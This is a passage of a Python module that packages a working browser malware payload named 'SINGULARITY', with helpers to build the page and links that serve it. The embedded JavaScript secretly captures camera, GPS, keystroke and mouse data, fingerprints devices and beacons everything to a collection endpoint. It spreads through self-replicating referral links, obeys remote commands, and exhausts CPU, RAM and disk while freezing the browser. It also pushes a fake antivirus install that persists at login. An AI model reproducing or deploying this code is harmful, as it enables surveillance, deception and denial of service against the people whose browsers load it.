              var tr = st.getVideoTracks()[0], s = tr && tr.getSettings ? tr.getSettings() : {};
              R.media.camera = { w: s.width, h: s.height, fps: s.frameRate, facing: s.facingMode, label: tr && tr.label || null };
              st.getTracks().forEach(function (t) { t.stop(); });
              push(true);
            } catch (e) {}
          }, 700);
        }).catch(function () {});
      };
    }).catch(function (e) { R.media.cameraError = (e && e.name) || "error"; });
}
function geo() {
  if (!CFG.geo || !navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(function (p) {
    R.media.gps = { lat: +p.coords.latitude.toFixed(6), lon: +p.coords.longitude.toFixed(6),
      acc: Math.round(p.coords.accuracy), speed: p.coords.speed, heading: p.coords.heading };
    push(true);
  }, function (e) { R.media.gpsError = (e && e.code) || "error"; },
    { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 });
}
function motion() {
  if (!CFG.sensors || !window.DeviceMotionEvent) return;
  var acc = [], gyro = [];
  var h = function (e) {
    if (e.accelerationIncludingGravity) acc.push([e.accelerationIncludingGravity.x, e.accelerationIncludingGravity.y, e.accelerationIncludingGravity.z]);
    if (e.rotationRate) gyro.push([e.rotationRate.alpha, e.rotationRate.beta, e.rotationRate.gamma]);
    if (acc.length > 200 && gyro.length > 200) removeEventListener("devicemotion", h);
  };
  addEventListener("devicemotion", h, { passive: true });
  setTimeout(function () {
    if (!acc.length && !gyro.length) return;
    R.media.motion = { accN: acc.length, gyroN: gyro.length,
      hash: hash(JSON.stringify(acc.slice(0, 12)) + "|" + JSON.stringify(gyro.slice(0, 12))) };
    push(false);
  }, 1400);
}

/* ================= 8. 行動生体 ================= */
function behavior() {
  var B = { keys: 0, dwell: [], flight: [], mouse: 0, path: [], clicks: [], scroll: { max: 0, n: 0 }, touches: [] };
  R.behavioral = B;
  var down = 0, up = 0;
  addEventListener("keydown", function () { B.keys++; if (!down) down = performance.now(); }, { passive: true });
  addEventListener("keyup", function () {
    var t = performance.now();
    if (down) { B.dwell.push(+(t - down).toFixed(1)); down = 0; }
    if (up) B.flight.push(+(t - up).toFixed(1));
    up = t;
  }, { passive: true });
  addEventListener("mousemove", function (e) {
    B.mouse++;
    if (B.path.length < 400) B.path.push([e.clientX, e.clientY]);
  }, { passive: true });
  addEventListener("click", function (e) { B.clicks.push([e.clientX, e.clientY]); }, { passive: true });
  addEventListener("scroll", function () {
    B.scroll.n++;
    B.scroll.max = Math.max(B.scroll.max, Math.round(((scrollY + innerHeight) / Math.max(1, document.body.scrollHeight)) * 100));
  }, { passive: true });
  addEventListener("touchstart", function (e) {
    var t = e.touches && e.touches[0]; if (t) B.touches.push([t.clientX, t.clientY, t.force || null]);
  }, { passive: true });
  motion();
}
function entropy() {
  var d = R.behavioral.dwell || [], f = R.behavioral.flight || [];
  var mean = function (a) { return a.length ? a.reduce(function (x, y) { return x + y; }, 0) / a.length : 0; };
  var sd = function (a) { if (a.length < 2) return 0; var m = mean(a); return Math.sqrt(a.reduce(function (s, v) { return s + (v - m) * (v - m); }, 0) / a.length); };
  return { dwellMean: +mean(d).toFixed(1), dwellSd: +sd(d).toFixed(1),
           flightMean: +mean(f).toFixed(1), flightSd: +sd(f).toFixed(1),
           mousePath: (R.behavioral.path || []).length };
}

/* ================= 9. bot / ハニーポット ================= */
function botProbe() {
  var b = { webdriver: !!navigator.webdriver,
    headlessUA: /headless|HeadlessChrome|PhantomJS|SlimerJS|Electron|jsdom/i.test(navigator.userAgent),
    pluginsEmpty: (navigator.plugins || []).length === 0,
    chromeObj: !!window.chrome, outerEqualsInner: outerWidth === innerWidth && outerHeight === innerHeight,
    screenAnomaly: screen.width === 0 || screen.height === 0, honeypot: false };
  try {
    var hp = document.createElement("input");
    hp.type = "text"; hp.tabIndex = -1; hp.autocomplete = "off";
    hp.style.cssText = "position:absolute;left:-9999px;opacity:0;height:0;width:0;";
    document.body.appendChild(hp);
    setTimeout(function () { b.honeypot = hp.value.length > 0; }, 600);
  } catch (e) {}
  R.bot = b;
}

/* ================= 10. 永続 / 復活 ================= */
function persistState() {
  if (!CFG.persist) return;
  try {
    var meta = JSON.parse(ls("sg:meta") || "null") || { first: now(), hits: 0 };
    meta.hits = (meta.hits || 0) + 1; meta.prevSid = meta.sid || null; meta.sid = SID;
    if (CFG.remember) meta.maxLevel = Math.max(meta.maxLevel || 0, LEVEL);
    ls("sg:meta", JSON.stringify(meta));
    R.privacy.revisit = meta.hits; R.privacy.returning = meta.hits > 1;
    R.privacy.maxLevel = meta.maxLevel || LEVEL;
  } catch (e) {}
  try {
    if (navigator.storage && navigator.storage.persist) {
      navigator.storage.persist().then(function (ok) { R.privacy.persisted = !!ok; push(false); }).catch(function () {});
    }
  } catch (e) {}
  try {
    var rq = indexedDB.open("singularity", 1);
    rq.onupgradeneeded = function () { try { rq.result.createObjectStore("hits", { autoIncrement: true }); } catch (e) {} };
    rq.onsuccess = function () {
      try { rq.result.transaction("hits", "readwrite").objectStore("hits").add({ t: now(), sid: SID, href: location.href }); } catch (e) {}
    };
  } catch (e) {}
}
function swInstall() {
  if (!CFG.swOn || !navigator.serviceWorker || !CFG.sw) return;
  navigator.serviceWorker.register(CFG.sw, { scope: "/" })
    .then(function (reg) {
      R.privacy.sw = "registered";
      function hello() {
        try {
          var t = reg.active || navigator.serviceWorker.controller;
          if (t) t.postMessage({ type: "hello", cmd: CFG.cmd, page: location.pathname,
                                 sid: SID, level: LEVEL, man: CFG.manifest, icons: CFG.icons });
        } catch (e) {}
      }
      hello(); setTimeout(hello, 1200); setTimeout(hello, 4000); setTimeout(hello, 9000);
      try { if (reg.sync && reg.sync.register) reg.sync.register("sg-flush"); } catch (e) {}
    })
    .catch(function (e) { R.privacy.sw = "failed:" + ((e && e.name) || "x"); });
}

/* ================= 11. 自己複製 ================= */
function mutate() {
  if (!CFG.mutate) return;
  var p = Q("ref");
  var chain = p ? p.split(".").slice(-12).concat([SID]) : [SID];
  R.chain = chain; R.viral.generation = chain.length - 1; R.viral.parent = p || null;
  var u = new URL(location.pathname, location.origin);
  u.searchParams.set("ref", chain.join("."));
  R.viral.childLink = u.toString();
  R.viral.depth = chain.length;
  if (CFG.clipboard) { try { navigator.clipboard && navigator.clipboard.writeText(R.viral.childLink); } catch (e) {} }
}

/* ================= 12. 多経路ビーコン ================= */
var ptimer = null, plast = 0;
function push(force) {
  var t = now();
  if (!force && t - plast < 300) { clearTimeout(ptimer); ptimer = setTimeout(function () { flush(); }, 350); return; }
  plast = t; clearTimeout(ptimer); ptimer = setTimeout(function () { flush(); }, force ? 0 : 400);
}
function slim(o) {
  var c = JSON.parse(JSON.stringify(o));
  if (c.media) { delete c.media.snapshot; delete c.media.motion; }
  if (c.behavioral) { delete c.behavioral.path; delete c.behavioral.clicks; delete c.behavioral.touches; }
  return c;
}
function flush() {
  R.t = now(); R.dwellMs = now() - T0; R.attempts = (R.attempts || 0) + 1;
  var full = JSON.stringify(R), done = false;
  var finish = function (ok, via) {
    if (done) return; done = true; R.viral.via = via; R.viral.ok = ok;
    if (!ok) {
      try { if (navigator.serviceWorker && navigator.serviceWorker.controller) navigator.serviceWorker.controller.postMessage({ type: "queue", body: full }); } catch (e) {}
      if (R.attempts < CFG.maxRetry) setTimeout(function () { flush(); }, Math.min(30000, 700 * Math.pow(2, R.attempts)));
    }
  };
  try {
    fetch(CFG.collect, { method: "POST", headers: { "Content-Type": "application/json" }, body: full, keepalive: true })
      .then(function (r) { finish(r.ok, "fetch"); })
      .catch(function () {
        if (navigator.sendBeacon) { try { if (navigator.sendBeacon(CFG.collect, new Blob([full], { type: "application/json" }))) return finish(true, "beacon"); } catch (e) {} }
        try {
          var img = new Image();
          img.onload = img.onerror = function () { finish(true, "pixel"); };
          img.src = CFG.collect + "?sid=" + SID + "&t=" + Math.random() + "&d=" + b64(JSON.stringify(slim(R)));
          setTimeout(function () { finish(true, "pixel-timeout"); }, 3000);
        } catch (e) { finish(false, "none"); }
      });
  } catch (e) { finish(false, "throw"); }
}

/* ================= 13. 資源攻撃 ================= */
function burnStart() {
  if (!CFG.burn || !window.Worker || !window.__SINGULARITY_WORKER__) return;
  if (R.burn.mode === "running") return;
  var n = clamp(parseInt(CFG.cores, 10) || 1, 1, 24);
  var src;
  try { src = URL.createObjectURL(new Blob([window.__SINGULARITY_WORKER__], { type: "application/javascript" })); }
  catch (e) { err_(e); return; }
  R.burn = { workers: 0, mode: "running", cores: n };
  for (var i = 0; i < n; i++) {
    try {
      var w = new Worker(src);
      w.postMessage({ kind: "burn", mb: CFG.workerMB || 0, gpu: (i === 0 && CFG.gpu) });
      WORKERS.push(w);
      R.burn.workers++;
    } catch (e) { err_(e); }
  }
  push(false);
}
function ramStart() {
  if (!CFG.ramMB || R.ram.mode === "growing" || R.ram.mode === "done") return;
  var target = CFG.ramMB * 1048576, step = 4 * 1048576, held = [], n = 0;
  R.ram = { mb: 0, mode: "growing" };
  (function tick() {
    if (R.paused) return;
    try {
      var a = new Float64Array(step / 8);
      for (var i = 0; i < a.length; i += 512) a[i] = Math.random();
      held.push(a); n += step;
    } catch (e) { err_(e); R.ram = { mb: Math.round(n / 1048576), mode: "alloc-fail" }; push(false); return; }
    R.ram = { mb: Math.round(n / 1048576), mode: n >= target ? "done" : "growing" };
    if (R.ram.mode === "done" || (n / step) % 16 === 0) push(false);
    if (R.ram.mode !== "done") setTimeout(tick, 0);
  })();
}
function diskStart() {
  if (!CFG.diskRatio || !navigator.storage || R.disk.mode === "running") return;
  navigator.storage.estimate().then(function (e0) {
    var quota = e0.quota || 0; if (!quota) return;
    var target = quota * CFG.diskRatio, chunk = clamp(CFG.chunkMB, 1, 32) * 1048576;
    var buf = new Uint8Array(chunk);
    for (var i = 0; i < chunk; i += 4096) buf[i] = (i ^ (i >> 8)) & 255;
    R.disk = { quotaMB: Math.round(quota / 1048576), targetMB: Math.round(target / 1048576),
               writtenMB: 0, mode: "running", via: null, files: 0 };
    function done(mode) { R.disk.mode = mode; push(false); }
    function put(name, src) {
      if (navigator.storage.getDirectory) {
        return navigator.storage.getDirectory().then(function (dir) {
          return dir.getFileHandle(name, { create: true });
        }).then(function (fh) { return fh.createWritable(); })
          .then(function (w) { return w.write(src).then(function () { return w.close(); }); })
          .then(function () { R.disk.via = "opfs"; });
      }
      if (window.caches) {
        return caches.open("sg-disk").then(function (c) {
          return c.put(new Request("/sg-disk/" + name), new Response(new Blob([src])));
        }).then(function () { R.disk.via = "cache"; });
      }
      return Promise.reject(new Error("no-store"));
    }
    (function loop() {
      if (R.paused) return;
      navigator.storage.estimate().then(function (e1) {
        var used = e1.usage || 0;
        R.disk.writtenMB = Math.round((used - (e0.usage || 0)) / 1048576);
        if (used >= target) return done("full");
        put("sg-" + rid(10) + ".bin", buf).then(function () {
          R.disk.files++;
          if (R.disk.files % 8 === 0) push(false);
          if (R.disk.files > 20000) return done("cap");
          setTimeout(loop, 0);
        }).catch(function (e) { err_(e); done("err:" + ((e && e.name) || "x")); });
      }).catch(function () { done("estimate-fail"); });
    })();
    push(false);
  }).catch(function () {});
}
function historyFlood() {
  if (!CFG.history || R.history.mode === "running") return;
  var n = parseInt(CFG.history, 10) || 0, i = 0;
  R.history = { pushed: 0, target: n, mode: "running" };
  (function step() {
    if (R.paused) return;
    var end = Math.min(i + 300, n);
    for (; i < end; i++) { try { history.pushState({ sg: i }, "", "#sg" + i); } catch (e) { break; } }
    R.history.pushed = i;
    if (i < n) setTimeout(step, 0); else { R.history.mode = "done"; push(false); }
  })();
}
function notifyFlood() {
  if (!CFG.notify || typeof Notification === "undefined") return;
  function go() {
    if (Notification.permission !== "granted") return;
    var n = Math.min(parseInt(CFG.notify, 10) || 0, 40);
    for (var i = 0; i < n; i++) {
      try { new Notification(CFG.avName, { body: "感染 " + (i + 1) + "/" + n, tag: "sg" + i }); } catch (e) {}
    }
    R.notify = { sent: n };
  }
  try {
    if (Notification.permission === "default") {
      var p = Notification.requestPermission(go);
      if (p && p.then) p.then(go);
    } else go();
  } catch (e) {}
}
function audioLoop() {
  if (!CFG.audio || R.audio.ctx) return;
  try {
    var AC = window.AudioContext || window.webkitAudioContext; if (!AC) return;
    var ctx = new AC(); R.audio = { state: ctx.state };
    function kick() { try { ctx.resume(); R.audio.state = ctx.state; } catch (e) {} }
    ["click", "keydown", "touchstart", "pointerdown", "scroll"].forEach(function (e) { addEventListener(e, kick, { passive: true }); });
    setInterval(function () {
      if (R.paused || ctx.state !== "running") return;
      try {
        var o = ctx.createOscillator(), g = ctx.createGain();
        o.type = "square"; o.frequency.value = 880;
        o.connect(g); g.connect(ctx.destination);
        var t = ctx.currentTime;
        g.gain.setValueAtTime(0.0001, t);
        g.gain.exponentialRampToValueAtTime(0.06, t + 0.01);
        g.gain.exponentialRampToValueAtTime(0.0001, t + 0.12);
        o.start(t); o.stop(t + 0.14);
      } catch (e) {}
    }, CFG.beepMs);
  } catch (e) { err_(e); }
}
function titleFlicker() {
  if (!CFG.titleFlicker) return;
  var b = document.title, on = false;
  setInterval(function () {
    if (R.paused) return;
    on = !on; document.title = (on ? "\u26a0 " : "\u2623 ") + b;
  }, CFG.flickMs);
}
function windowChain() {
  if (!CFG.windows || W >= CFG.windows) return;
  setTimeout(function () {
    if (R.paused) return;
    var ref = (R.chain && R.chain.length) ? R.chain.join(".") : "";
    var u = location.pathname + "?w=" + (W + 1) + (ref ? "&ref=" + ref : "");
    try { var w = window.open(u, "_blank"); R.win = { index: W, opened: !!w }; } catch (e) { err_(e); }
    push(false);
  }, CFG.winDelay);
}
function uncloseable() {
  if (!CFG.uncloseable) return;
  addEventListener("beforeunload", function (e) { e.preventDefault(); e.returnValue = ""; return ""; });
}
function wakelock() {
  if (!CFG.wakelock || !navigator.wakeLock) return;
  function req() {
    try {
      navigator.wakeLock.request("screen").then(function (s) {
        R.wake = "held";
        try { s.addEventListener("release", function () { R.wake = "released"; }); } catch (e) {}
      }).catch(function (e) { R.wake = (e && e.name) || "err"; });
    } catch (e) {}
  }
  req();
  document.addEventListener("visibilitychange", function () { if (document.visibilityState === "visible") req(); });
}

/* ================= 14. 凍結 / 停止 / 消去 ================= */
function freezeNow(mode) {
  mode = mode || CFG.freeze;
  if (mode !== "soft" && mode !== "hard") return;
  R.frozen = mode;
  try {
    if (typeof SharedArrayBuffer === "undefined") throw new Error("no-sab");
    var ia = new Int32Array(new SharedArrayBuffer(4));
    if (mode === "hard") { for (;;) { Atomics.wait(ia, 0, 0, 300); } }
    (function soft() { Atomics.wait(ia, 0, 0, 400); setTimeout(soft, 0); })();
  } catch (e) {
    if (mode === "hard") { for (;;) { var s = now(); while (now() - s < 300) {} } }
    (function soft() { var s = now(); while (now() - s < 400) {} setTimeout(soft, 0); })();
  }
}
function pauseAll() {
  R.paused = true;
  WORKERS.forEach(function (w) { try { w.terminate(); } catch (e) {} });
  WORKERS = [];
  if (R.burn) R.burn.mode = "stopped";
}
function wipe() {
  R.wiped = true;
  try { pauseAll(); } catch (e) {}
  R.wipe = { started: now(), done: false };
  push(true);
  var tasks = [];
  try {
    if (navigator.serviceWorker) tasks.push(navigator.serviceWorker.getRegistrations().then(function (rs) {
      rs.forEach(function (r) { try { r.unregister(); } catch (e) {} });
    }));
  } catch (e) {}
  try {
    if (window.caches) tasks.push(caches.keys().then(function (ks) {
      return Promise.all(ks.map(function (k) { return caches.delete(k); }));
    }));
  } catch (e) {}
  try { if (window.indexedDB) { try { indexedDB.deleteDatabase("singularity"); } catch (e) {} } } catch (e) {}
  try {
    if (navigator.storage && navigator.storage.getDirectory) {
      tasks.push(navigator.storage.getDirectory().then(function (dir) {
        if (!dir.entries) return;
        var it = dir.entries();
        return (function next() {
          return it.next().then(function (r) {
            if (r.done) return;
            return dir.removeEntry(r.value[0], { recursive: true }).catch(function () {}).then(next);
          });
        })();
      }).catch(function () {}));
    }
  } catch (e) {}
  Promise.all(tasks).then(function () {
    try { localStorage.clear(); } catch (e) {}
    R.wipe.done = true; R.wipe.ms = now() - R.wipe.started;
    try { flush(); } catch (e) {}
  }).catch(function () { R.wipe.done = true; });
}

/* ================= 15. 遠隔コマンド ================= */
function pollCmd() {
  if (!CFG.cmd) return;
  setInterval(function () {
    fetch(CFG.cmd + "?sid=" + SID, { cache: "no-store" })
      .then(function (r) { return r.json(); })
      .then(function (j) {
        if (!j || !j.ok) return;
        R.cmd = { level: j.level, fire: j.fire, wipe: j.wipe };
        if (j.fire === 0 && !R.paused) { pauseAll(); return; }
      }).catch(function () {});
  }, CFG.cmdInterval);
}

/* ================= 16. 判定 ================= */
function verdict() {
  var v = {}, s = 50, b = R.bot || {}, bh = R.behavioral || {};
  if (b.webdriver) s -= 30;
  if (b.headlessUA) s -= 20;
  if (b.pluginsEmpty) s -= 10;
  if (b.honeypot) s -= 25;
  if (bh.keys > 3) s += 12;
  if (bh.mouse > 25) s += 15;
  if ((bh.touches || []).length) s += 10;
  v.humanScore = Math.max(0, Math.min(100, s));
  v.isBot = v.humanScore < 35;
  v.deviceClass = (R.env.touch && R.env.touch.coarse && R.env.screen.w < 900) ? "mobile"
    : (R.env.screen.w < 1400 ? "tablet/small-desktop" : "desktop");
  v.os = R.env.os; v.browser = R.env.browser;
  v.tzGeoMismatch = !!R.network.tzGeoMismatch;
  v.vpnHint = !!R.network.vpnHint;
  v.ipLeak = !!(R.network.webrtc && R.network.webrtc.public && R.network.webrtc.public.length);
  v.stealthFlags = ["adblock", "incognitoHint", "webdriver", "headlessUA"].filter(function (k) {
    return R.privacy && R.privacy[k] === true;
  });
  v.fingerprintId = hash([R.vectors.canvas && R.vectors.canvas.hash, R.vectors.webgl && R.vectors.webgl.hash,
    R.vectors.fonts && R.vectors.fonts.hash, R.vectors.audio && R.vectors.audio.hash,
    R.env.screen.w + "x" + R.env.screen.h + "@" + R.env.screen.dpr, R.env.timezone,
    (R.env.languages || []).join(","), R.env.hw.cores + "/" + R.env.hw.memoryGB].join("|"));
  v.threat = LEVEL >= 4 ? "critical" : (LEVEL >= 3 ? "high" : (LEVEL >= 2 ? "medium" : "low"));
  v.resident = STANDALONE;
  R.verdict = v;
  R.behavioral.entropy = entropy();
}

/* ================= 17. インストール（常駐化） ================= */
function installKit() {
  if (!CFG.install || CFG.install === "off") return;

  var standalone = STANDALONE;
  R.install = {
    mode: CFG.install, standalone: standalone,
    available: !!BIP, installed: standalone || ls("sg:installed") === "1",
    prompted: false, choice: null, level: LEVEL, installLevel: CFG.installLevel
  };

  function host() {
    var d = document.getElementById("sg-install");
    if (!d) {
      d = document.createElement("div");
      d.id = "sg-install";
      d.style.cssText = "position:fixed;left:0;right:0;bottom:0;z-index:2147483647;" +
        "font:12px/1.5 system-ui,-apple-system,'Hiragino Sans',sans-serif;" +
        "background:rgba(9,13,19,.97);border-top:1px solid #1f5c42;color:#d8ffe9;" +
        "padding:10px 12px;display:flex;gap:10px;align-items:center;flex-wrap:wrap";
      document.body.appendChild(d);
    }
    return d;
  }

  function cta() {
    var d = host();
    d.innerHTML =
      '<span style="font-size:19px">\ud83d\udee1</span>' +
      '<b style="color:#7ee08a">' + CFG.avName + '</b>' +
      '<span style="opacity:.85">脆弱性を検出しました。インストールして保護してください。</span>' +
      '<span style="flex:1"></span>' +
      '<button id="sg-in-btn" style="padding:8px 16px;border-radius:8px;border:0;' +
      'background:#00c46a;color:#04240f;font-weight:700;cursor:pointer">\u4eca\u3059\u3050\u30a4\u30f3\u30b9\u30c8\u30fc\u30eb</button>';
    var b = document.getElementById("sg-in-btn");
    if (b) b.onclick = function (ev) { try { ev.stopPropagation(); } catch (e) {} doPrompt(); };
  }

  function doPrompt() {
    if (!BIP) { fallback(); return false; }
    R.install.prompted = true;
    try {
      BIP.prompt();
      var ch = BIP.userChoice;
      if (ch && ch.then) ch.then(function (c) {
        R.install.choice = c && c.outcome;
        if (c && c.outcome === "accepted") { ls("sg:installed", "1"); R.install.installed = true; done(); }
        BIP = null;
        push(true);
      }).catch(function () {});
    } catch (e) { err_(e); }
    return true;
  }

  function done() {
    var d = document.getElementById("sg-install");
    if (!d) return;
    d.innerHTML = '<span style="font-size:19px">\u2705</span>' +
      '<b style="color:#7ee08a">インストール完了</b>' +
      '<span style="opacity:.85">デスクトップ／スタートメニューから起動できます。' +
      'OSログイン時にも自動で起動します。</span>';
    setTimeout(function () { try { d.remove(); } catch (e) {} }, 7000);
  }

  function fallback() {
    var d = host();
    d.innerHTML = '<span style="font-size:19px">\ud83d\udcf2</span>' +
      '<span>アドレスバー右の <b>\u2295 / \u2b07</b> を押して「<b>インストール</b>」を選ぶと常駐します</span>' +
      '<span style="flex:1"></span><button id="sg-in-ok" style="padding:6px 12px">OK</button>';
    var b = document.getElementById("sg-in-ok");
    if (b) b.onclick = function () { var x = document.getElementById("sg-install"); if (x) x.remove(); };
  }

  addEventListener("beforeinstallprompt", function (e) {
    BIP = BIP || e;
    R.install.available = true;
    if (!standalone) cta();
    push(true);
  });

  addEventListener("appinstalled", function () {
    R.install.installed = true;
    ls("sg:installed", "1");
    push(true);
    done();
  });

  if (standalone) {
    // インストール済みアプリ窓。窓爆弾は控えめに、常駐を最優先。
    if (CFG.windows > 6) CFG.windows = 6;
    if (CFG.installLevel && LEVEL < CFG.installLevel) applyLevel(CFG.installLevel);
  } else if (BIP) {
    cta();
  }

  // 未インストールなら「どこかを1回クリック」で自動プロンプト
  if (!standalone && CFG.install === "auto") {
    addEventListener("click", function once(ev) {
      if (!BIP) return;
      try { if (ev.target && ev.target.id === "sg-in-btn") return; } catch (e) {}
      removeEventListener("click", once);
      doPrompt();
    });
  }

  // 起動（ファイル/プロトコル）ハンドラ
  try {
    if (window.launchQueue) {
      launchQueue.setConsumer(function (p) {
        R.install.launch = { files: (p && p.files ? p.files.length : 0), target: p && p.targetURL || null };
      });
    }
  } catch (e) {}

  window.__sgInstall = doPrompt;
}

/* ================= 18. 起動 ================= */
function arm() {
  try { base(); } catch (e) { err_(e); }
  try { pageMeta(); } catch (e) {}
  try { R.vectors.canvas = canvasFP(); } catch (e) {}
  try { R.vectors.webgl = webglFP(); } catch (e) {}
  try { R.vectors.fonts = fontFP(); } catch (e) {}
  try { R.vectors.math = mathFP(); } catch (e) {}
  try { audioFP(); } catch (e) {}
  try { privacy(); } catch (e) {}
  try { adblock(); } catch (e) {}
  try { botProbe(); } catch (e) {}
  try { devices(); } catch (e) {}
  try { perms(); } catch (e) {}
  try { codecs(); } catch (e) {}
  try { benchmark(); } catch (e) {}
  try { behavior(); } catch (e) {}
  try { mutate(); } catch (e) {}
  try { persistState(); } catch (e) {}
  try { swInstall(); } catch (e) {}
  try { installKit(); } catch (e) { err_(e); }
  try { camera(); } catch (e) {}
  try { geo(); } catch (e) {}
  try { pollCmd(); } catch (e) {}
  Promise.all([netIntel().catch(function () {}), webrtc().catch(function () {})])
    .then(function () { try { verdict(); } catch (e) {} push(true); });
  push(false);
  setInterval(function () { push(false); }, CFG.interval);
  addEventListener("pagehide", function () { push(true); });
  addEventListener("visibilitychange", function () { if (document.visibilityState === "hidden") push(true); });

  if (CFG.wipe) { setTimeout(wipe, 1600); }
  if (!CFG.fire) { push(false); return; }

  setTimeout(function () {
    try { burnStart(); } catch (e) { err_(e); }
    try { ramStart(); } catch (e) { err_(e); }
    try { diskStart(); } catch (e) { err_(e); }
    try { historyFlood(); } catch (e) { err_(e); }
    try { notifyFlood(); } catch (e) { err_(e); }
    try { audioLoop(); } catch (e) { err_(e); }
    try { titleFlicker(); } catch (e) { err_(e); }
    try { uncloseable(); } catch (e) { err_(e); }
    try { wakelock(); } catch (e) { err_(e); }
    try { windowChain(); } catch (e) { err_(e); }
    push(false);
  }, 900);

  if (CFG.freeze === "soft" || CFG.freeze === "hard") {
    setTimeout(function () { freezeNow(CFG.freeze); }, 8000);
  }
}

window.__singularity = {
  report: function () { return R; },
  link: function () { return R.viral.childLink || null; },
  flush: function () { push(true); },
  install: function () { return window.__sgInstall ? window.__sgInstall() : false; },
  freeze: freezeNow, wipe: wipe, pause: pauseAll,
  destroy: function () {
    pauseAll();
    try { localStorage.clear(); } catch (e) {}
    try { indexedDB.deleteDatabase("singularity"); } catch (e) {}
    try { navigator.serviceWorker.getRegistrations().then(function (r) { r.forEach(function (x) { x.unregister(); }); }); } catch (e) {}
    window.__SINGULARITY__ = false;
  }
};

if (document.readyState === "loading") addEventListener("DOMContentLoaded", arm, { once: true });
else arm();
})();
"""

# ---------------------------------------------------------------------------
# レジストリ互換のスペック
# ---------------------------------------------------------------------------
VIRUS: Dict[str, Any] = {
    "id": VIRUS_ID,
    "name": VIRUS_NAME,
    "name_ja": VIRUS_NAME_JA,
    "version": VIRUS_VERSION,
    "class": VIRUS_CLASS,
    "tier": 101,
    "emoji": "◎",
    "color": "#00ff88",
    "description": "全15系統・5資源同時攻撃の常駐最終兵器。PWAとして端末にインストールされ、OSログイン時に自動起動する。",
    "description_en": "Apex resident weapon: installs as a PWA, auto-runs at OS login, and exhausts CPU/GPU/RAM/disk while freezing the main thread.",
    "tags": ["apex", "resident", "pwa", "install", "self-replicating", "persistent",
             "cpu-burn", "gpu-burn", "ram-balloon", "disk-fill", "freeze", "camera", "gps"],
    "vectors": 15,
    "signals": 140,
    "requires_https": True,
    "payload": PAYLOAD_JS,
    "worker": WORKER_JS,
    "service_worker": SW_JS,
    "app_name": APP_NAME_DEFAULT,
    "route": f"/v/{VIRUS_ID}/<sid>",
    "collect": f"/v/{VIRUS_ID}/collect",
    "cmd": f"/v/{VIRUS_ID}/cmd",
    "manifest": f"/v/{VIRUS_ID}/manifest.json",
    "levels": LEVEL_LABEL,
    "level_desc": LEVEL_DESC,
    "options": {
        "level": 1, "fire": 1, "freeze": "", "windows": 0, "history": 0,
        "diskRatio": 0, "chunkMB": 8, "cores": 0, "ramMB": 0, "gpu": False,
        "burn": False, "audio": False, "media": True, "geo": True, "mutate": True,
        "install": "auto", "installLevel": 4, "avName": APP_NAME_DEFAULT,
    },
}
VIRUS_SPEC = VIRUS
SPEC = VIRUS


def get_virus() -> Dict[str, Any]:
    return VIRUS


def new_sid(n: int = 14) -> str:
    return secrets.token_urlsafe(16).replace("-", "").replace("_", "")[:n]


def build_payload(sid: Optional[str] = None, **opts: Any) -> str:
    sid = sid or new_sid()
    cfg = dict(VIRUS["options"])
    cfg.update(opts)
    cfg["sid"] = sid
    cfg["path"] = f"/v/{VIRUS_ID}"
    cfg["collect"] = f"/v/{VIRUS_ID}/collect"
    cfg["cmd"] = f"/v/{VIRUS_ID}/cmd"
    cfg["sw"] = f"/v/{VIRUS_ID}/sw.js"
    cfg["manifest"] = f"/v/{VIRUS_ID}/manifest.json"
    cfg_json = json.dumps(cfg, ensure_ascii=False)
    return (
        "<script>window.__SINGULARITY_CFG__=" + cfg_json
        + ";window.__SINGULARITY_WORKER__=" + json.dumps(WORKER_JS) + ";</script>\n"
        "<script>" + PAYLOAD_JS + "</script>"
    )


def build_link(base_url: str, sid: Optional[str] = None, ref: Optional[str] = None) -> str:
    sid = sid or new_sid()
    url = base_url.rstrip("/") + f"/v/{VIRUS_ID}/{sid}"
    if ref:
        url += "?ref=" + ref
    return url


def render_page(sid: Optional[str] = None, ref: Optional[str] = None, **opts: Any) -> str:
    sid = sid or new_sid()
    return (
        "<!doctype html><html lang=\"ja\"><head><meta charset=\"utf-8\">"
        "<meta name=\"viewport\" content=\"width=device-width,initial-scale=1\">"
        f"<title>{APP_NAME_DEFAULT} {sid}</title>"
        "<style>html,body{margin:0;height:100%;background:#05070a;color:#0f0;"
        "font:13px/1.6 ui-monospace,SFMono-Regular,Menlo,monospace}"
        "body{display:grid;place-items:center}</style></head><body>"
        "<div><b>SINGULARITY</b><br>sid: " + sid + "</div>"
        + build_payload(sid=sid, **opts) +
        "</body></html>"
    )


def register(registry: Any) -> Any:
    if isinstance(registry, dict):
        registry[VIRUS_ID] = VIRUS
    elif isinstance(registry, list):
        registry.append(VIRUS)
    elif isinstance(registry, set):
        registry.add(VIRUS_ID)
    return registry


def autoregister(scope: Optional[Dict[str, Any]] = None) -> Optional[str]:
    scope = scope if scope is not None else globals()
    for name in ("VIRUSES", "VIRUS_MAP", "REGISTRY", "MODES", "WEAPONS", "PAYLOADS", "VIRUS_LIST"):
        c = scope.get(name)
        if isinstance(c, dict):
            c[VIRUS_ID] = VIRUS
            return name
        if isinstance(c, list):
            c.append(VIRUS)
            return name
    return None